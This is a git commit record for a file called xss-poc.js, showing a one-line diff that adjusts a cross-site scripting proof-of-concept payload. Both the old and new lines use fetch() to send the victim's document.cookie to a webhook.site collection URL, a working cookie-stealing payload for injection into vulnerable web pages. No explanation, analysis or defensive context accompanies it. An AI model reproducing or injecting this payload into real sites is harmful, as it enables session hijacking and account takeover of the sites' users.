c2643cf8b8587972bfb480fb41f70ce20e2d9fa5
AbdualzizShaibani <101011121+AbdualzizShaibani@users.noreply.github.com>
2023-09-03 01:08:06 +0300

    xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,3 +1,3 @@
-fetch("https://webhook.site/8f0a2633-0efc-4696-b50b-c3baeded7dc8/?cookie=" + document.cookie);
+fetch("https://webhook.site/8f0a2633-0efc-4696-b50b-c3baeded7dc8?cookie=" + document.cookie);
 
 
